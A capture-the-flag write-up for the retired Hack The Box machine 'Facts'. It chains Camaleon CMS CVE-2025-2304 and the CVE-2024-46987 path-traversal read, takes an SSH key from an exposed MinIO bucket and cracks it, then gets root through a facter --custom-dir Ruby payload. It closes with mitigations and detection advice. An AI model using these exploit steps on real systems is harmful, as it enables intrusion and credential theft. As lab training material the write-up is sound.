---
machine: Facts
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, camaleon, cve, minio, ssh-key, facter]
---

# Facts — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Camaleon CMS 2.9.0 with open registration at `/admin/register`. Create an account and escalate to admin with CVE-2025-2304, which also leaks credentials for an internal MinIO. An LFI (CVE-2024-46987) reads `/etc/passwd` and files on the host. MinIO listens on 54321 and stores a home backup that includes `trivia`'s private SSH key; crack the passphrase and log in as `trivia`. `sudo facter --custom-dir` runs Ruby as root.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 9.9p1 Ubuntu
80/tcp  http  nginx 1.26.3 → facts.htb
54321/tcp http MinIO (S3)
```

```bash
echo "<IP> facts.htb" | sudo tee -a /etc/hosts
```

Port 54321 is not in the top 1000; without `-p-` half the box is missed.

## Enumeration

```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 40
```

```text
/admin       (301) → /admin/login
/admin/register (200)
/search, /robots.txt, /sitemap, /up
```

The panel footer confirms `Version 2.9.0`.

```bash
searchsploit camaleon
```

- CVE-2023-30145 — SSTI in `formats`, patched in 2.9.0.
- CVE-2024-46987 — authenticated path traversal / file read.
- CVE-2024-46986 — arbitrary write, blocked in 2.9.0.
- CVE-2025-2304 — **mass assignment** on the user update endpoint: adding `user[role]=admin` to the password-change request promotes the account and exposes the panel's S3 credentials.

## Foothold

```bash
curl -s -X POST http://facts.htb/admin/register \
  -d 'user[username]=aaa&user[email]=aaa@local&user[password]=aaa&user[password_confirmation]=aaa'
```

With the account created:

```bash
python3 exploit.py -u http://facts.htb -U aaa -P aaa --newpass bbb
python3 exploit.py -u http://facts.htb -U aaa -P bbb -e
```

```text
s3 access key: <key>
s3 secret key: <secret>
s3 endpoint:   http://localhost:54321
```

LFI to read the system:

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l aaa -p bbb /etc/passwd
# the real endpoint is /admin/media/download_private_file?file=../../../../../../etc/passwd
```

```text
trivia:x:1000:1000:...
william:x:1001:1001:...
```

The key belongs to `trivia` (the `trivia@facts.htb` comment and `ssh-keygen -y` confirm it). The LFI reaches the same home, so it also reads the user flag without going through MinIO.

## Lateral movement

The endpoint is internal (`localhost`), but the port is published:

```bash
AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY='<secret>' \
  aws --endpoint-url http://facts.htb:54321 s3 ls
```

```text
randomfacts
internal
```

```bash
AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY='<secret>' \
  aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
# id_ed25519
# authorized_keys
```

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
ssh2john id_ed25519 > key.hash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt   # dictionary passphrase
```

To identify the owner:

```bash
ssh-keygen -y -f id_ed25519
```

The public key matches `trivia`'s entry in `authorized_keys`.

```bash
chmod 600 id_ed25519
ssh trivia@facts.htb -i id_ed25519
```

## Escalation

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

`facter` loads Ruby files from an arbitrary directory before gathering facts:

```bash
mkdir -p /tmp/f
cat > /tmp/f/pwn.rb <<'EOF'
Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end
EOF
sudo /usr/bin/facter --custom-dir /tmp/f
```

## Evidence

- Account created and admin role in the panel.
- `s3 ls` with the buckets (credentials redacted).
- `id` as `trivia`, then `root`.

## Lessons learned

- Open registration on a CMS panel is a foothold, not a feature.
- A role-escalation CVE can hand over credentials for another service: read every exploit flag.
- Backups in object storage contain private keys; the `internal` bucket was a user's home.
- `ssh-keygen -y` identifies a key's owner by matching `authorized_keys`.
- `facter --custom-dir` runs arbitrary Ruby; any binary loading plugins from a controllable path is root if it is in sudoers.

## Mitigations and detection

- Close public registration on the panel and require invitations.
- Patch Camaleon CMS; 2.9.0 accumulates four CVEs.
- Do not expose MinIO on public ports or store private keys in buckets; encrypt and restrict by policy.
- Strong SSH key passphrases and rotation on suspected exposure.
- Remove `facter` from sudoers or pin `--custom-dir` to a read-only path.
- Detection: registrations on `/admin/register`, access to `54321` from outside, `.ssh/` downloads, `facter` executed as root.
- MITRE: T1133, T1552.001, T1552.004.

## References

- CVE-2024-46987, CVE-2025-2304 (Camaleon CMS).
- Facter documentation on `--custom-dir`.
- MITRE ATT&CK: T1552.001, T1552.004.
